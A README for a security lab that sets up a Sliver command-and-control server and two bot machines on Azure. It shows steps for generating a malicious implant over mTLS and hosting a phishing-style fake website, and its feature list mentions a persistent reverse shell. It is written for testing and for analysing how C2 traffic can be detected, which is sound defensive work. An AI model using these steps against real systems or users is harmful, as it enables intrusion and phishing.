# C2Lab

- C2Lab - A lightweight and customizable Command &amp; Control (C2) lab using Sliver for testing and analyzing botnet communications, persistence, and network detection techniques.

## 🚀 Project Overview

- This lab demonstrates how to set up a **C2 infrastructure using Sliver****, deploy bots, establish communication over mTLS, and implement persistence** while capturing network **traffic for analysis.**
<img src="assets/sliver_framework.jpg" width="400" alt="Sliver C2 Framework Logo" />

## 🛠 Features

- **Terraform (IaC) automation** for deploying the **C2 server and botnet machines.**
- **mTLS-secured C2 communication** over port **443.**
- **Fake website hosting** for social engineering.
- **Persistent reverse shell** with a **systemd service.**
- **PCAP captures** for analyzing C2 and bot interactions.
- **Detection techniques** for identifying encrypted C2 traffic.

## 📌 Steps Performed

1️⃣ **Infrastructure Deployment**
- Used Terraform to deploy (as in the below picture, also Terraform scripts are included in that repo):
  - C2 Machine
  - Botnet Machines (2 bots)
  <img src="assets/Deployed_C2_and_Botnet.png" width="400" alt="Deployed Machines from Azure Dashboard" />

2️⃣ **Setting Up the C2 Server**
- SSH into C2 machine (you can change the username from the .tf script by the way)
  ```sh
  ssh azureuser@[C2 Machine Public IP Address]
  ```
- Installed Sliver
  ```sh
  curl https://sliver.sh/install|sudo bash
  sliver
  ```
- Generated an Implant (Malicious Payload), then Created a Listener on Port 443 using mTLS (See [Multiple Domains/Protocols Section](https://sliver.sh/docs?name=Getting+Started), if you want to use Multiple Protocols
  ```sh
  sliver > generate --mTLS [C2 Machine Public IP Address] --os linux --arch amd64 --save [Payload Name]
  ```
  <img src="assets/Sliver_Generating_Implant.png" width="500" alt="Sliver Generating Implant (Malicious Payload)" />

3️⃣ **Fake Website Hosting (HTML File Includedd)**

- Created a phishing-style HTML page to simulate a real website.
- Hosted it on the C2 server
- Transferred the HTML file to **/var/www/html/index.html** on the C2 machine.
- Hosted the website using Apache by placing it in the default web root directory.
- Restarted the Apache service using
  ```sh
  sudo systemctl restart apache2
  ```
- This made the fake website accessible over HTTP.
<img src="assets/Our_Malicious_Website.png" width="500" alt="Our Malicious Made" />
